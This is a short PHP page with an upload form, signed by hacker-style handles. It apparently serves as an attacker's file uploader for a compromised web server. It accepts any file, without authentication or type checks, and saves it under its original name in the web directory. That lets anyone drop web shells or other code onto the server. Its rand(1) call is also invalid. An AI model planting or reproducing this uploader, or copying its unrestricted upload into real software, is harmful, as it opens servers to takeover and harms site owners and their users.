<?php
if(isset($_POST['btn-upload']))
{
     $pic = rand(1)."".$_FILES['pic']['name'];
    $pic_loc = $_FILES['pic']['tmp_name'];
     $folder="";
     if(move_uploaded_file($pic_loc,$folder.$pic))
     {
        ?><script>alert('Uploaded =)');</script><?php
     }
     else
     {
        ?><script>alert('error =(');</script><?php
     }
}

?>
<!--
by m3nstr1x 
-->
<!DOCTYPE html>
<html>
<head>
<title>Upload By v0ld3x</title>
</head>
<body>
 <h1 style="font-family: Courier New; font-size:30px; ">Upload By v0ld3x</h1><br>
<form action="" method="post" enctype="multipart/form-data">
<input type="file" name="pic" />
<button type="submit" name="btn-upload">upload</button>
</form>
</body>
</html>
